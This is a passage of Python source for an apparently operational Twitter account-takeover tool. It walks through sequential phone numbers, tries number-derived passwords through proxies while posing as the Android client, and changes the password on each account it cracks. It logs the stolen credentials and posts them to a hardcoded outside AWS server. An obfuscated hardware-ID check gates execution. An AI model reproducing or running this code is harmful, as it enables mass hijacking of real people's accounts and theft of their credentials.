                        self.totalScan = self.totalScan + 1
                        self.password_errors = self.password_errors + 1
                else:
                    self.failAttemps = self.failAttemps + 1
                    self.totalScan = self.totalScan + 1
                    self.gsm_errors = self.gsm_errors + 1

                    # ConsoleLogger.log(f"GSM not found {gsm}")
            else:
                self.totalScan = self.totalScan + 1
                self.login_flow_errors = self.login_flow_errors + 1
                # ConsoleLogger.log(f"Login flow token FAIL")
        except Exception as e:
            with open("exceptions.txt", "a") as file:
                file.write(f"{gsm}:{passwd}" + str(e) + "\n")
            self.exceptions = self.exceptions + 1
            print(e)
            self.exceptions_data.append({"phone_number":f"{gsm}:{passwd}"})
            pass

    def change_password_handler(self,accounts):
        for x in accounts:
            new_password = self.password_generator()
            self.threadHandler(self.change_password,x['password'], new_password, x['oauth_token'], x['oauth_token_secret'],x['gsm'],x['username'])

    def change_password(self, old_password, new_password, oauth_token, oauth_token_secret, gsm, username):
        session = requests.session()
        adapter = TlsAdapter(ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1)
        session.mount("https://", adapter)

        response = session.post(url='https://api-0-4-6.twitter.com/i/account/change_password.json',
                                 proxies={'http':self.proxy_string,'https':self.proxy_string},
                                 headers={
                                     'User-Agent': 'TwitterAndroid/9.18.0-release.00 (29180000-r-0) MI+6/9 (Xiaomi;MI+6;Xiaomi;sagit;0;;1;2016)',
                                     'X-Twitter-Client': 'TwitterAndroid',
                                     'Content-Type': 'application/x-www-form-urlencoded',
                                     "Timezone": "Europe/Istanbul",
                                     "OS-Security-Patch-Level": "2019-09-01",
                                     "Optimize-Body": "true",
                                     "Accept": "application/json",
                                     "X-Twitter-Client": "TwitterAndroid",
                                     "User-Agent": "TwitterAndroid/9.18.0-release.00 (29180000-r-0) MI+6/9 (Xiaomi;MI+6;Xiaomi;sagit;0;;1;2016)",
                                     "Accept-Encoding": "gzip,deflate",
                                     "X-Twitter-Client-Language": "tr-TR",
                                     "X-Twitter-Client-Version": "9.18.0-release.00",
                                     "Cache-Control": "no-store", "X-Twitter-Active-User": "no",
                                     "X-Twitter-API-Version": "5",
                                     "Accept-Language": "tr-TR",
                                     "X-Twitter-Client-Flavor": "",
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "Connection": "close"},
                                 data=f'current_password={old_password}&password={new_password}&password_confirmation={new_password}',
                                 auth=OAuth1(CONSUMER_KEY, CONSUMER_SECRET,
                                             oauth_token, oauth_token_secret,
                                             decoding=None),verify=False)
        print(f"{gsm}:{old_password}:{new_password} -> {response.text}")
        if response.status_code == 200:
            self.success.append({"data": f"{username}:{gsm}:{old_password}"})
            self.failAttemps = 0
            textfile_scs = open("account_success.txt", "a")
            textfile_scs.write(
                f"{username}:{gsm}:{new_password}\n")
            textfile_scs.close()


            self.totalScan = self.totalScan + 1
            self.lastSuccessDate = datetime.datetime.now()
            self.success = self.success + 1
        else:
            self.locked_data.append({"phone_number": f"{gsm}:{old_password}"})
            textfile_scs = open("password-change-errors.txt", "a")
            textfile_scs.write(
                f"{username}:{gsm}:{old_password}\n")
            textfile_scs.close()
            self.totalScan = self.totalScan + 1
            self.password_change_errors = self.password_change_errors + 1

    def password_generator(self):
        generated_password = ''
        for x in range(0, 8):
            generated_password = generated_password + chars[random.randint(0, len(chars) - 1)]
        generated_password = generated_password + str(random.randint(1000, 9999))
        return generated_password

class AWS:
    def send_job(self, data):
        try:
            response = requests.post("http://ec2-3-251-92-78.eu-west-1.compute.amazonaws.com/api/jobs",
                                     headers={"Content-Type": "application/json"}, data=json.dumps(data))
            print(response.text)
            if response.status_code == 200:
                if json.loads(response.text)["success"] == True:
                    return True
        except Exception as e:
            return False

    def check_ip(self):
        response = requests.get("https://checkip.amazonaws.com/")
        if response.status_code == 200:
            return response.text.rstrip()

    def send_data(self, data, path):
        try:
            response = requests.post(f"http://ec2-3-251-92-78.eu-west-1.compute.amazonaws.com{path}",
                                     headers={"Content-Type": "application/json"}, data=json.dumps(data))
            print(response.text)
            if response.status_code == 200:
                if json.loads(response.text)["success"] == True:
                    return True
        except Exception as e:
            return False


def iMYrgAdMWL():
    return subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

def fkgn429312():
    # if str(str(datetime.datetime.utcnow()).split(' ')[0].split('-')[1]) != '09':
    # return False

    for x in MxGlBchXYs:
        if codecs.decode(x, 'rot13') == (iMYrgAdMWL()):
            return True
    return False

def main():

    aws = AWS()
    ip = aws.check_ip()

    if not fkgn429312():
        return

    isUnexpectedStopper = False

    if sys.version_info[0] == 3 and sys.version_info[1] >= 8 and sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    delay_seconds_per_requests = 0

    configuration = read_configuration()
    threads = configuration.threads
    first_launch = True

    last_value = ''

    try:
        with open(f"last.json", "r") as lastFile:
            last_value = json.loads(lastFile.read().rstrip())
    except:
        with open(f"last.json", "w") as lastNew:
            lastNew.write(json.dumps({"countryCode": configuration.countries[0].countryCode, "gsmCode": configuration.countries[0].gsmCode,
                                      "last": configuration.countries[0].minLength}))

            last_value = {"countryCode": configuration.countries[0].countryCode,
                                    "gsmCode": configuration.countries[0].gsmCode,
                                    "last": configuration.countries[0].minLength}


    for selected_country in configuration.countries:
        if isUnexpectedStopper:
            print("Got loginFlowError in 25 round , stopeed")
            break


        if first_launch:
            if (selected_country.countryCode != last_value["countryCode"]) or (selected_country.gsmCode != last_value["gsmCode"]):
                continue
        else:
            last_value = {"countryCode":selected_country.countryCode,"gsmCode":selected_country.gsmCode,"last":selected_country.minLength}

        first_launch = False


        twitter = Twitter(configuration)
        twitter.current_step = int(last_value["last"])

        #DenyLoginSubtask
        while twitter.current_step + threads < selected_country.maxLength:

            generated_pairs = []
            twitter.password_errors = 0
            twitter.gsm_errors = 0
            twitter.success = 0
            twitter.successRate = 0
            twitter.password_change_errors = 0
            twitter.lastSuccessDate = ''
            twitter.exceptions_data = []
            twitter.success_data = []
            twitter.wrong_passwords_data = []
            twitter.locked_data = []
            twitter.not_registred_data = []


            start = time.perf_counter()

            for x in range(twitter.current_step, twitter.current_step + threads):
                generated_pairs.append(f"+{selected_country.countryCode}{selected_country.gsmCode}{x}:"
                                       f"{selected_country.suffix}{selected_country.gsmCode}{x}")

            run_parallel(0, threads, twitter.check_account, generated_pairs)

            twitter.current_step += threads #2001000

            time.sleep(delay_seconds_per_requests)

            end = time.perf_counter()

            twitter.change_password_handler(twitter.success_accounts)
            twitter.success_accounts.clear()

            twitter.totalSuccess = read_total_success()

            with open(f"last.json", "w") as lastFileWrite:
                lastFileWrite.write(json.dumps({"countryCode":selected_country.countryCode,"gsmCode":selected_country.gsmCode,
                                                "last":str(twitter.current_step)}))

            os.system('cls')
            print(f"SUCCESS -> {len(twitter.success_data)}")
            print(f"LOCKED -> {len(twitter.locked_data)}")
            print(f"EXCEPTIONS -> {len(twitter.exceptions_data)}")
            print(f"WRONG_PASS -> {len(twitter.wrong_passwords_data)}")
            print(f"NOT REGISTRED -> {len(twitter.not_registred_data)}")
            print(f"CURRENT STEP -> {twitter.current_step}")

            if len(twitter.success_data) > 0:
                aws.send_data(twitter.success_data,'/api/accounts/success/add')
            if len(twitter.locked_data) > 0:
                aws.send_data(twitter.locked_data, '/api/accounts/locked/add')
            if len(twitter.exceptions_data) > 0:
                aws.send_data(twitter.exceptions_data, '/api/accounts/exceptions/add')
            if len(twitter.wrong_passwords_data) > 0:
                aws.send_data(twitter.wrong_passwords_data, '/api/accounts/wrongpasswords/add')
            if len(twitter.not_registred_data) > 0:
                aws.send_data(twitter.not_registred_data, '/api/accounts/notregistred/add')



def read_configuration():
    if not fkgn429312():
        return
    with open("configuration.json", "r") as configurationFile:
        configurationFile = json.loads(configurationFile.read())
        return ConfigurationModel(int(configurationFile['threads']),
                                  str(configurationFile['proxyUsername']),
                                  str(configurationFile['proxyPassword']),
                                  str(configurationFile['proxyHost']),
                                  int(configurationFile['proxyPort']),
                                  list(configurationFile['countries']))

def read_total_success():
    try:
        with open("account_success.txt", "r") as total_success_file:
            return str(len(total_success_file.readlines()))
    except:
        return '0'

async def async_payload_wrapper(event_loop, start, end, async_method, accounts):
    ctx = ssl.create_default_context()
    ctx.options |= (ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1)
    ctx.set_ciphers(":".join(CIPHERS))
    ctx.verify_mode = ssl.CERT_REQUIRED
    conn = aiohttp.TCPConnector(ssl=ctx)
    if not fkgn429312():
        return
    async with aiohttp.ClientSession(loop=event_loop, trust_env=True, connector=conn) as session:
        corou_to_execute = [async_method(launchID, session, accounts) for
                            launchID in
                            range(start, end)]
        await asyncio.gather(*corou_to_execute)

def run_parallel(start, end, async_method, accounts):
    if not fkgn429312():
        return
    event_loop = asyncio.get_event_loop()
    event_loop.run_until_complete(async_payload_wrapper(event_loop, start, end, async_method, accounts))

class ConfigurationModel:
    def __init__(self, threads, proxyUsername, proxyPassword, proxyHost, proxyPort, countries):
        self.threads = threads
        self.proxyUsername = proxyUsername
        self.proxyPassword = proxyPassword
        self.proxyHost = proxyHost
        self.proxyPort = proxyPort
        self.countries = []
        for x in countries:
            self.countries.append(
                CountryModel(x['maxLength'], x['minLength'], x['suffix'], x['countryCode'], x['gsmCode'], x['counter'],
                             x['scanRange']))

class CountryModel:
    def __init__(self, maxLength, minLength, suffix, countryCode, gsmCode, counter, scanRange):
        self.maxLength = maxLength
        self.minLength = minLength
        self.suffix = suffix
        self.countryCode = countryCode
        self.gsmCode = gsmCode
        self.counter = counter
        self.scanRange = scanRange

main()